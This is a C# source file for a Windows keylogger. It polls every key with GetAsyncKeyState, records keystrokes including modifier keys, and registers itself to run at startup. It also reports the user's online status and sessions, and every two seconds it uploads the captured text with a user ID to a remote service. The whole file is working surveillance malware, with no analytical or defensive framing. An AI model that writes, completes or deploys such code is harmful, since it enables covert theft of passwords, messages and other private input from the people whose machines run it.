using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace KLConsole
{
    class MainLogic
    {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);


        private int TIME_TO_SEND_DATA = 2000;//30 min 1800000

        private String text;
        private System.Timers.Timer timer;
        private ServiceReferenceText.TextClient tClient;
        private UserLogic uLogic;
        private int uID;

        public MainLogic()
        {
            tClient = new ServiceReferenceText.TextClient();
            uLogic = new UserLogic(new UserInfo().GetInfo());
            uID = uLogic.GetUserID();
        }

        /// <summary>
        /// Check autorun
        /// </summary>
        private void AutoRunLogic()
        {
            AutoRun autoRun = new AutoRun();
            if (autoRun.IsAutoRun())
                autoRun.AddToAutoRun();
        }

        /// <summary>
        /// Starts key logger
        /// </summary>
        public void LetsGo()
        {
            AutoRunLogic();
            uLogic.SetStatus("online");
            uLogic.StartSession();
            TimerStart();
            StartLogging();
        }

        /// <summary>
        /// Start timer for save in database
        /// </summary>
        private void TimerStart()
        {
            timer = new System.Timers.Timer(TIME_TO_SEND_DATA);
            timer.Elapsed += async (sender, e) => await SendTextToDB();
            timer.Start();
        }

        /// <summary>
        /// To delete garbage
        /// </summary>
        private String[] commandCodeKeys = new String[] {
            "16 ", "17 ", "18 ","20","144","160 ","161 ",
            "162 ", "163 ", "164 ", "165 ", "Oem1 ",
            "Oem2 ", "Oem3 ", "Oem4 ", "Oem5 ", "Oem6 ",
            "Oem7 ", "Oem8 ", "Oem102 ", "OemPlus ", "OemMinus ",
             "OemClear ", "OemComma ", "OemPeriod ",
            "D1 ", "D2 ", "D3 ","D4 ","D5 ",
            "D6 ", "D7 ", "D8 ","D9 ","D0 ",
        };

        private Task SendTextToDB()
        {
            return Task.Run(() =>
            {
                if (!String.IsNullOrEmpty(text) && !String.IsNullOrWhiteSpace(text))
                {
                    foreach (var item in commandCodeKeys)
                        text = text.Replace(item, "");
                    //ID USER поменять
                    tClient.UpdateText(text, uID);
                    Console.WriteLine(text);
                    text = string.Empty;
                }
            });
        }

        /// <summary>
        /// Reads keys
        /// </summary>
        private void StartLogging()
        {
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {

                        if (!ControlKeysParse((ConsoleKey)i) && !ControlKeysParse(i) )
                        {
                            text += (ConsoleKey)i + " ";
                            Console.WriteLine((ConsoleKey)i);
                            // continue;
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Parsing string
        /// </summary>
        /// <param name="key">key to parce</param>
        /// <returns></returns>
        /// 
        private bool ControlKeysParse(ConsoleKey key)
        {
            switch (key)
            {
                case ConsoleKey.D0:
                    text += "0 ";
                    return true;
                case ConsoleKey.D1:
                    text += "1 ";
                    return true;
                case ConsoleKey.D2:
                    text += "2 ";
                    return true;
                case ConsoleKey.D3:
                    text += "3 ";
                    return true;
                case ConsoleKey.D4:
                    text += "4 ";
                    return true;
                case ConsoleKey.D5:
                    text += "5 ";
                    return true;
                case ConsoleKey.D6:
                    text += "6 ";
                    return true;
                case ConsoleKey.D7:
                    text += "7 ";
                    return true;
                case ConsoleKey.D8:
                    text += "8 ";
                    return true;
                case ConsoleKey.D9:
                    text += "9 ";
                    return true;
                case ConsoleKey.Oem1:
                    text += "; ";
                    return true;
                case ConsoleKey.Oem2:
                    text += "/ ";
                    return true;
                case ConsoleKey.Oem3:
                    text += "` ";
                    return true;
                case ConsoleKey.Oem4:
                    text += "[ ";
                    return true;
                case ConsoleKey.Oem5:
                    text += @"\ ";
                    return true;
                case ConsoleKey.Oem6:
                    text += "] ";
                    return true;
                case ConsoleKey.Oem7:
                    text += "' ";
                    return true;
                case ConsoleKey.Oem8:
                    text += "9 ";
                    return true;
                case ConsoleKey.Oem102:
                    text += @"\ ";
                    return true;
                case ConsoleKey.OemClear:
                    text += "OemClear ";
                    return true;
                case ConsoleKey.OemComma:
                    text += ", ";
                    return true;
                case ConsoleKey.OemMinus:
                    text += "- ";
                    return true;
                case ConsoleKey.OemPeriod:
                    text += ". ";
                    return true;
                case ConsoleKey.OemPlus:
                    text += "= ";
                    return true;
            }
            return false;
        }

        /// <summary>
        /// Parsing string
        /// </summary>
        /// <param name="key">key to parce</param>
        /// <returns></returns>
        private bool ControlKeysParse(int key)
        {
            switch (key)
            {
                case 20:
                    text += "Caps Lock ";
                    return true;
                case 144:
                    text += "Num Lock ";
                    return true;
                case 145:
                    text += "Scroll Lock ";
                    return true;
                case 160:
                    text += "LShift ";
                    return true;
                case 161:
                    text += "RShift ";
                    return true;
                case 162:
                    text += "LCtrl ";
                    return true;
                case 163:
                    text += "RCtrlt ";
                    return true;
                case 164:
                    text += "LAlt ";
                    return true;
                case 165:
                    text += "RAlt ";
                    return true;
            }
            return false;
        }

        /// <summary>
        /// Save to txt
        /// </summary>
        private void SaveToTxt()
        {
            string filename = "loger.log";
            using (StreamWriter sw = new StreamWriter(filename, true))
            {
                sw.Write(text);
            }
        }

        /// <summary>
        /// closing application set offline status
        /// </summary>
        public void ChangeStatus()
        {
            uLogic.SetStatus("offline");
        }

        /// <summary>
        /// closing application set end of session
        /// </summary>
        public void StopSession()
        {
            uLogic.EndSession();
        }
    }
}
